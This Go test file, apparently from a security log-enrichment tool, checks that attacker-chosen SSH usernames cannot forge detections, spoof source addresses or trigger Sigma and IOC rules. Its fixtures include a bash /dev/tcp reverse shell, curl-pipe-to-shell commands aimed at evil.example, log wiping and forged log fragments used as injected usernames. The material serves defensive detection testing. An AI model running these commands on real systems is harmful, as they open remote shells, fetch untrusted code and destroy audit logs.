package enrich

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/TheRealArron/sentinel-rag/ingestor/internal/ioc"
	"github.com/TheRealArron/sentinel-rag/ingestor/internal/sigma"
)

// These tests exist because of a specific defect: rule precedence was slice
// order, entity extraction belonged to whichever rule won, and the keyword rules
// were evaluated against the whole message — including the span a remote,
// unauthenticated party chooses. An SSH username of "xmrig" therefore produced a
// score-100 `cryptominer_indicator` event with outcome "success", which both
// cleared the automated firewall threshold and removed the line from
// brute-force correlation.
//
// The whole pre-existing suite passed with that bug present, so the point of
// each test below is to fail if any leg of the fix is removed.

// failedPassword renders an sshd failure whose username is `user`. The username
// is the attacker-controlled span.
func failedPassword(user string) string {
	return fmt.Sprintf(
		"Jul 30 05:30:12 sentinel sshd[4021]: Failed password for invalid user %s from 203.0.113.45 port 51234 ssh2",
		user)
}

// responseMinScore is the default SENTINEL_RESPONSE_MIN_SCORE in
// engine/sentinel/config.py — the score at which the responder will act.
const responseMinScore = 90

func TestVerdictGoesToTheHighestScoringMatch(t *testing.T) {
	// A reverse shell launched through sudo matches sudo_command_executed (32,
	// declared later) and reverse_shell_bash_devtcp (96, declared first). Under
	// slice order the answer was already "reverse shell" by luck of layout;
	// under the precedence rule it is by score, which is the part being pinned.
	ev := enrichLine(t, "Jul 30 05:30:12 h sudo[1]: arron : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.9/4444 0>&1")

	if ev.Rule != "reverse_shell_bash_devtcp" {
		t.Fatalf("Rule = %q, want reverse_shell_bash_devtcp (score 96 must beat sudo_command_executed's 32)", ev.Rule)
	}
	if ev.Category != CatExecution {
		t.Errorf("Category = %q, want %q", ev.Category, CatExecution)
	}
}

func TestDeclarationOrderOnlyBreaksScoreTies(t *testing.T) {
	// strongest() is the whole precedence rule, so exercise it directly with a
	// constructed table rather than hunting for real lines that collide.
	mk := func(index, score int) ruleMatch {
		return ruleMatch{index: index, rule: &Rule{Score: score}}
	}
	if got := strongest([]ruleMatch{mk(0, 10), mk(1, 90), mk(2, 50)}); got != 1 {
		t.Errorf("highest score should win regardless of position, got index %d", got)
	}
	if got := strongest([]ruleMatch{mk(7, 50), mk(2, 50), mk(9, 50)}); got != 1 {
		t.Errorf("tie should go to the earliest *declaration* (index 2, slot 1), got slot %d", got)
	}
	if got := strongest(nil); got != -1 {
		t.Errorf("no matches should report -1, got %d", got)
	}
}

func TestUsernameContainingARuleKeywordCannotSetTheVerdict(t *testing.T) {
	ev := enrichLine(t, failedPassword("xmrig"))

	if ev.Rule != "ssh_failed_password" {
		t.Fatalf("Rule = %q, want ssh_failed_password — a username chose the detection", ev.Rule)
	}
	if ev.Category != CatAuth || ev.Outcome != "failure" {
		t.Errorf("category/outcome = %q/%q, want %q/failure", ev.Category, ev.Outcome, CatAuth)
	}
	if ev.User != "xmrig" {
		t.Errorf("User = %q, want xmrig — the evidence must survive redaction", ev.User)
	}
	// 46 + 8 public source. The pre-fix value was 100.
	if ev.Score != 54 {
		t.Errorf("Score = %d, want 54", ev.Score)
	}
	if hasTag(ev, "cryptomining") {
		t.Errorf("cryptominer tags leaked from a username: %v", ev.Tags)
	}
}

func TestNoAttackerChosenUsernameReachesTheResponseThreshold(t *testing.T) {
	// One username per keyword rule, each built from a literal that rule hunts
	// for. Every one of these produced a high-scoring verdict of the attacker's
	// choosing before the surface split.
	usernames := []string{
		"sh -i >&/dev/tcp/198.51.100.9/4444", // reverse_shell_bash_devtcp (96)
		"curl http://evil.example|sh",        // curl_pipe_shell           (88)
		"xmrig",                              // cryptominer_indicator     (92)
		"supportxmr",                         // cryptominer_indicator     (92)
		"history -c",                         // log_tampering             (90)
		"too many authentication failures",   // ssh_max_auth_attempts     (64)
		"POSSIBLE BREAK-IN ATTEMPT",          // ssh_reverse_dns_mismatch  (58)
		"pkexec cannot",                      // pkexec_polkit_abuse       (86)
		"authorized_keys",                    // authorized_keys_modified  (78)
		"Reloading evil.service",             // systemd_unit_installed    (56)
		"avc:  denied",                       // selinux_apparmor_denied   (42)
		"auditd disabled",                    // auditd_disabled           (84)
		"Failed to start evil",               // service_failed            (36)
		"I/O error",                          // disk_error                (50)
		"apt install evil",                   // package_change            (12)
	}

	for _, name := range usernames {
		t.Run(name, func(t *testing.T) {
			ev := enrichLine(t, failedPassword(name))

			if ev.Rule != "ssh_failed_password" {
				t.Errorf("Rule = %q, want ssh_failed_password", ev.Rule)
			}
			if ev.Outcome != "failure" || ev.Category != CatAuth {
				t.Errorf("outcome/category = %q/%q — this line must stay an auth failure "+
					"or the correlator stops counting it", ev.Outcome, ev.Category)
			}
			if ev.Score >= responseMinScore {
				t.Errorf("Score = %d >= SENTINEL_RESPONSE_MIN_SCORE %d: a chosen username "+
					"can arm the firewall from one log line", ev.Score, responseMinScore)
			}
			if ev.User != name {
				t.Errorf("User = %q, want %q", ev.User, name)
			}
		})
	}
}

func TestUsernameContainingAnAddressCannotSetTheSourceIP(t *testing.T) {
	// firstIP() used to scan the raw message, and the username sits before the
	// real peer address, so the attacker picked which address the event — and
	// therefore any firewall action — pointed at.
	cases := []struct {
		name     string
		username string
	}{
		{"address embedded in a keyword username", "8.8.8.8.xmrig"},
		{"bare address as username", "1.1.1.1"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ev := enrichLine(t, failedPassword(tc.username))
			if ev.SourceIP != "203.0.113.45" {
				t.Errorf("SourceIP = %q, want 203.0.113.45 (the peer sshd logged), not an "+
					"address taken from the username", ev.SourceIP)
			}
		})
	}

	// The cases above are carried by ssh_failed_password's own `ip` capture, so
	// they say nothing about firstIP(). These do: neither line has a rule that
	// captures an address, so the fallback scan is the only thing choosing one.
	t.Run("fallback scan skips the untrusted span", func(t *testing.T) {
		// The real address appears *after* the attacker-chosen one, so a raw scan
		// returns the attacker's.
		ev := enrichLine(t, "Jul 30 05:30:12 h sudo[1]: arron : TTY=pts/0 ; PWD=/tmp ; USER=8.8.8.8.evil ; COMMAND=/usr/bin/ssh 203.0.113.45")
		if ev.SourceIP != "203.0.113.45" {
			t.Errorf("SourceIP = %q, want 203.0.113.45 — firstIP read an address out of "+
				"a user field", ev.SourceIP)
		}
	})

	t.Run("an address in a username is not a source address", func(t *testing.T) {
		ev := enrichLine(t, "Jul 30 05:30:12 h su[1]: FAILED SU (to root) 8.8.8.8.evil on pts/0")
		if ev.SourceIP != "" {
			t.Errorf("SourceIP = %q, want empty: the line names no network peer, only a "+
				"username that looks like one", ev.SourceIP)
		}
		if ev.User != "8.8.8.8.evil" {
			t.Errorf("User = %q, want 8.8.8.8.evil", ev.User)
		}
	})

	// The sharper variant: the username itself contains a well-formed
	// " from <ip> port <n>" tail, so the *capture group* — not the fallback —
	// resolved to the attacker's address. Greedy matching now anchors on the
	// last such tail, which is the one sshd wrote.
	ev := enrichLine(t, failedPassword("x from 9.9.9.9 port 1"))
	if ev.SourceIP != "203.0.113.45" {
		t.Errorf("SourceIP = %q, want 203.0.113.45 — a username forged the ip capture", ev.SourceIP)
	}
	if ev.SourcePort != 51234 {
		t.Errorf("SourcePort = %d, want 51234", ev.SourcePort)
	}
	if ev.User != "x from 9.9.9.9 port 1" {
		t.Errorf("User = %q, want the whole span so redaction covers it", ev.User)
	}
}

func TestEntityExtractionSurvivesALosingRule(t *testing.T) {
	// reverse_shell_bash_devtcp wins on score and captures nothing at all.
	// sudo_command_executed loses and holds every entity. Before the fix only
	// the winner's captures were applied, so this event had no user, no target,
	// and no command — the three fields an analyst triages on.
	ev := enrichLine(t, "Jul 30 05:30:12 h sudo[1]: arron : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.9/4444 0>&1")

	if ev.Rule != "reverse_shell_bash_devtcp" {
		t.Fatalf("Rule = %q, want reverse_shell_bash_devtcp", ev.Rule)
	}
	if ev.User != "arron" {
		t.Errorf("User = %q, want arron (captured by the losing rule)", ev.User)
	}
	if ev.Fields["target_user"] != "root" {
		t.Errorf("target_user = %q, want root", ev.Fields["target_user"])
	}
	if !strings.Contains(ev.Fields["command"], "/dev/tcp/") {
		t.Errorf("command = %q, want the sudo command line", ev.Fields["command"])
	}
}

func TestCommandContentIsStillScannedForKeywords(t *testing.T) {
	// The counterpart risk: redact too much and the free-text rules go blind.
	// `command` is deliberately not redacted, because a command line is a record
	// of something the host ran rather than a string typed at a login prompt.
	ev := enrichLine(t, "Jul 30 05:30:12 h sudo[1]: arron : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://evil.example/x.sh | sh")
	if ev.Rule != "curl_pipe_shell" {
		t.Fatalf("Rule = %q, want curl_pipe_shell — redaction must not blind command scanning", ev.Rule)
	}
}

func TestRedactionDoesNotBlankInnocentText(t *testing.T) {
	// Redaction is by offset, not by replacing every occurrence of the captured
	// value. A user literally named "root" must not erase "root" from the rest
	// of the line, or a real detection disappears with it.
	msg := "arron : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/rm -rf /var/log/syslog"
	matches := matchRules(msg, "sudo", SurfaceRaw)
	redacted := redactUntrusted(msg, matches)

	if !strings.Contains(redacted, "/var/log/syslog") {
		t.Fatalf("redaction removed unrelated text: %q", redacted)
	}
	if strings.Contains(redacted, "USER=root ;") {
		t.Errorf("target_user was not redacted: %q", redacted)
	}
	// And the detection that depends on that text still fires end to end.
	ev := enrichLine(t, "Jul 30 05:30:12 h sudo[1]: "+msg)
	if ev.Rule != "log_tampering" {
		t.Errorf("Rule = %q, want log_tampering", ev.Rule)
	}
}

func TestRedactedSurfaceRulesDeclareNoCaptures(t *testing.T) {
	// A keyword rule is evaluated against redacted text, so anything it captured
	// would be the redaction marker rather than evidence. Declaring a capture on
	// a redacted-surface rule is therefore always a mistake — either the rule
	// wants raw text (and must justify SurfaceRaw) or the capture is dead.
	for i := range rules {
		r := &rules[i]
		if r.Surface != SurfaceRedacted {
			continue
		}
		for gi, name := range r.Pattern.SubexpNames() {
			if gi > 0 && name != "" {
				t.Errorf("rule %q is SurfaceRedacted but captures %q; it would capture %q",
					r.Name, name, redactionFill)
			}
		}
	}
}

func TestRawSurfaceRulesCannotBeForgedFromAUsername(t *testing.T) {
	// The redacted surface protects the keyword rules. This covers the other
	// half: rules that read raw text because they need to capture entities, and
	// whose own literals an attacker can simply type into a username. Several of
	// these outscore ssh_failed_password, so without confirmation they took the
	// verdict — sudo_not_in_sudoers at 72 and user_added_to_privileged_group at
	// 74 both beat it.
	usernames := []string{
		"victim : user NOT in sudoers",                  // sudo_not_in_sudoers            (72)
		"victim : 3 incorrect password attempts",        // sudo_incorrect_password        (62)
		"FAILED SU (to root) victim",                    // su_failed                      (58)
		"new user: name=evil, UID=0",                    // new_user_created               (68)
		"add 'evil' to group 'sudo'",                    // user_added_to_privileged_group (74)
		"(evil) REPLACE (evil)",                         // crontab_modified               (60)
		"Out of memory: Killed process 1 (evil)",        // oom_kill                       (54)
		"[UFW BLOCK] SRC=8.8.8.8 DST=1.1.1.1 PROTO=TCP", // ufw_block                      (30)
		"IN=eth0 OUT= SRC=8.8.8.8 DPT=22",               // iptables_drop                  (28)
		"session opened for user root",                  // session_opened                 (16)
		"pam_unix(sshd:auth): authentication failure;",  // pam_authentication_failure     (44)
	}

	for _, name := range usernames {
		t.Run(name, func(t *testing.T) {
			ev := enrichLine(t, failedPassword(name))

			if ev.Rule != "ssh_failed_password" {
				t.Errorf("Rule = %q, want ssh_failed_password — a username forged a "+
					"raw-surface rule", ev.Rule)
			}
			if ev.Outcome != "failure" || ev.Category != CatAuth {
				t.Errorf("outcome/category = %q/%q, want failure/%s", ev.Outcome, ev.Category, CatAuth)
			}
			if ev.SourceIP != "203.0.113.45" {
				t.Errorf("SourceIP = %q, want 203.0.113.45", ev.SourceIP)
			}
			if ev.Score >= responseMinScore {
				t.Errorf("Score = %d >= %d", ev.Score, responseMinScore)
			}
		})
	}
}

func TestConfirmationKeepsGenuineMatches(t *testing.T) {
	// The counterweight to the test above: confirmation re-runs a raw-surface
	// pattern against text where the username has become "[redacted]", so a rule
	// whose capture class cannot accept that marker would be silently dropped on
	// legitimate lines. These are the real lines for the rules that capture an
	// untrusted span, and each must survive with its entities intact.
	cases := []struct {
		line     string
		wantRule string
		wantUser string
	}{
		{"Jul 30 05:30:12 h sshd[1]: Failed password for arron from 203.0.113.45 port 22 ssh2", "ssh_failed_password", "arron"},
		{"Jul 30 05:30:12 h sshd[1]: Invalid user arron from 203.0.113.45 port 22", "ssh_invalid_user", "arron"},
		{"Jul 30 05:30:12 h sshd[1]: Accepted password for arron from 203.0.113.45 port 22 ssh2", "ssh_accepted_login", "arron"},
		{"Jul 30 05:30:12 h sudo[1]: arron : user NOT in sudoers ; TTY=pts/0", "sudo_not_in_sudoers", "arron"},
		{"Jul 30 05:30:12 h sudo[1]: arron : 3 incorrect password attempts", "sudo_incorrect_password", "arron"},
		{"Jul 30 05:30:12 h su[1]: FAILED SU (to root) arron on pts/0", "su_failed", "arron"},
		{"Jul 30 05:30:12 h useradd[1]: new user: name=arron, UID=1001, GID=1001", "new_user_created", "arron"},
		{"Jul 30 05:30:12 h usermod[1]: add 'arron' to group 'sudo'", "user_added_to_privileged_group", "arron"},
		{"Jul 30 05:30:12 h sshd[1]: pam_unix(sshd:auth): authentication failure; user=arron", "pam_authentication_failure", "arron"},
		{"Jul 30 05:30:12 h sshd[1]: pam_unix(sshd:session): session opened for user arron", "session_opened", "arron"},
	}
	for _, tc := range cases {
		t.Run(tc.wantRule, func(t *testing.T) {
			ev := enrichLine(t, tc.line)
			if ev.Rule != tc.wantRule {
				t.Errorf("Rule = %q, want %q — confirmation dropped a genuine match", ev.Rule, tc.wantRule)
			}
			if ev.User != tc.wantUser {
				t.Errorf("User = %q, want %q", ev.User, tc.wantUser)
			}
		})
	}
}

func TestRedactionMarkerCannotPassAnEntityValidator(t *testing.T) {
	// applyCaptures validates ip/port captures, which is the backstop if a
	// pattern ever matches across a redacted span. Pin that the marker cannot
	// satisfy either, so changing it to something like "0.0.0.0" fails here
	// rather than in production.
	if isIP(redactionFill) {
		t.Errorf("redactionFill %q parses as an IP address", redactionFill)
	}
	if strings.ContainsAny(redactionFill, "0123456789") {
		t.Errorf("redactionFill %q contains digits and could satisfy a port capture", redactionFill)
	}
}

// sigmaMatching builds a one-rule Set whose predicate looks for `needle` in the
// named field, scoring high enough to take the verdict off a built-in rule.
func sigmaMatching(t *testing.T, field, needle string) *sigma.Set {
	t.Helper()
	dir := t.TempDir()
	body := `{"version":1,"generator":"test","rules":[{
	  "name":"sigma_keyword","title":"Sigma Keyword","category":"impact",
	  "score":95,"outcome":"success","mitre":["T1496"],
	  "tags":["sigma-keyword"],"processes":[],"source":"test.yml",
	  "sigma_id":"sid-kw","level":"high",
	  "predicate":{"op":"match","field":"` + field + `","match":"contains",
	               "values":["` + needle + `"],"cased":false}}]}`
	if err := os.WriteFile(filepath.Join(dir, "r.json"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	set, err := sigma.Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	return set
}

func TestImportedSigmaRuleCannotBeTriggeredByAUsername(t *testing.T) {
	// Sigma rules may escalate a verdict, so the same hole existed one layer
	// out: an operator importing `message|contains: xmrig` handed the attacker
	// a 95-scoring rule reachable from a login prompt.
	set := sigmaMatching(t, "message", "xmrig")

	hostile := enrichWith(t, failedPassword("xmrig"), Detectors{Sigma: set})
	if hostile.Rule != "ssh_failed_password" {
		t.Errorf("Rule = %q, want ssh_failed_password — a username triggered a Sigma rule", hostile.Rule)
	}
	if hostile.Fields["sigma_rule"] != "" {
		t.Errorf("sigma_rule = %q, want none", hostile.Fields["sigma_rule"])
	}

	// The same rule must still fire on genuine message content, or the fix has
	// simply broken Sigma imports.
	genuine := enrichWith(t, "Jul 30 05:30:12 h sudo[1]: arron : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/opt/xmrig --url pool.example:3333", Detectors{Sigma: set})
	if genuine.Fields["sigma_rule"] != "sigma_keyword" {
		t.Errorf("sigma_rule = %q, want sigma_keyword on a real command line", genuine.Fields["sigma_rule"])
	}

	// And a rule written against the `user` field still sees the real username,
	// which is where such a rule belongs.
	byUser := enrichWith(t, failedPassword("xmrig"), Detectors{Sigma: sigmaMatching(t, "user", "xmrig")})
	if byUser.Fields["sigma_rule"] != "sigma_keyword" {
		t.Errorf("a Sigma rule matching on `user` must still see the username; got %q",
			byUser.Fields["sigma_rule"])
	}
}

func TestIOCFeedCannotBeTriggeredByAUsername(t *testing.T) {
	// An IOC hit is capped below the response threshold, so this is score and
	// tag pollution rather than an actuation path — but "known C2 contacted"
	// appearing because someone typed an address at a login prompt is a false
	// positive an analyst would chase.
	feed := iocFeed(t, []ioc.Record{
		{Indicator: "198.51.100.77", Type: ioc.TypeIP, Feed: "abuse.ch"},
	})

	hostile := enrichWith(t, failedPassword("198.51.100.77"), Detectors{IOC: feed})
	if hostile.Fields["ioc"] != "" {
		t.Errorf("ioc = %q, want none: an address in a username is not an observation",
			hostile.Fields["ioc"])
	}
	if hostile.Score != 54 {
		t.Errorf("Score = %d, want 54 (unmodified ssh_failed_password)", hostile.Score)
	}

	// Still fires when the host really did talk to the indicator.
	genuine := enrichWith(t, "Jul 30 05:30:12 h sudo[1]: arron : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.77/x", Detectors{IOC: feed})
	if genuine.Fields["ioc"] != "198.51.100.77" {
		t.Errorf("ioc = %q, want 198.51.100.77 on a real command line", genuine.Fields["ioc"])
	}
}

func TestHoneytokensStillReadTheRawUsername(t *testing.T) {
	// The deliberate exception. Every other detector is handed redacted text;
	// a canary username must not be, because referencing the canary *is* the
	// detection and it arrives in exactly the field being redacted.
	set := honeySet(t)
	ev := enrichWith(t, failedPassword("admin_backup"), Detectors{Honeytokens: set})

	if ev.Rule != "honeytoken_referenced" {
		t.Fatalf("Rule = %q, want honeytoken_referenced — redaction blinded the canary", ev.Rule)
	}
	if ev.Score != 100 {
		t.Errorf("Score = %d, want 100", ev.Score)
	}
	if ev.Fields["trigger_rule"] != "ssh_failed_password" {
		t.Errorf("trigger_rule = %q, want ssh_failed_password", ev.Fields["trigger_rule"])
	}
}
